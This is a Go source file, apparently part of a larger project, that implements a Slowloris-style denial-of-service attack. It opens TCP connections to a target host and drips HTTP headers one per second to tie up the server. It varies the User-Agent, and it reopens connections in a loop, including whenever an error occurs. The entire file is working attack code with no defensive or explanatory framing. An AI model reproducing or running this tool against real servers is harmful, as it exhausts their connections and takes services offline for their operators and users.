package main

import (
	"net"
	"os"
	"fmt"
	"io/ioutil"
	"time"
	"strings"
)

func keepAlive(conn *net.TCPConn, addr string, port string, info string) {
	fmt.Println("Sending header: " + strings.Split(info, ": ")[0] + " to " + addr)
	_, err := conn.Write([]byte(info))
	checkNetError(conn, addr, port, err)
	time.Sleep(time.Second * 1)
}

func SpawnSocket(addr string, port string) {
	combinedAddr := addr + ":" + port
	tcpAddr, err := net.ResolveTCPAddr("tcp4", combinedAddr)
	checkError(err)
	conn, err := net.DialTCP("tcp", nil, tcpAddr)
	checkNetError(conn, addr, port, err)
	conn.SetKeepAlive(true)
	for i := 0; i < len(headers); i++ {
		keepAlive(conn, addr, port, headers[i])
	}
	userAgent := "User-Agent: " + userAgents[random(0, 25)]
	keepAlive(conn, addr, port, userAgent)
	host := "Host: " + addr + "\r\n\r\n"
	keepAlive(conn, addr, port, host)
	_, err = ioutil.ReadAll(conn)
	checkError(err)
	conn.Close()
}

func OpenSocket(addr string, port string, limit int) {
	totalReqs := 0
	for totalReqs <= limit {
		SpawnSocket(addr, port)
		totalReqs += 1
		if totalReqs > limit {
			fmt.Println("Thread done")
		} else {
			fmt.Println("Respawning new connection...")
		}
	}
}

func checkNetError(conn *net.TCPConn, addr string, port string, err error) {
    if err != nil {
		fmt.Fprintf(os.Stderr, "Fatal error: %s", err.Error())
		conn.Close()
		OpenSocket(addr, port, 10)
    }
}

func checkError(err error) {
    if err != nil {
		fmt.Fprintf(os.Stderr, "Fatal error: %s", err.Error())
        os.Exit(1)
    }
}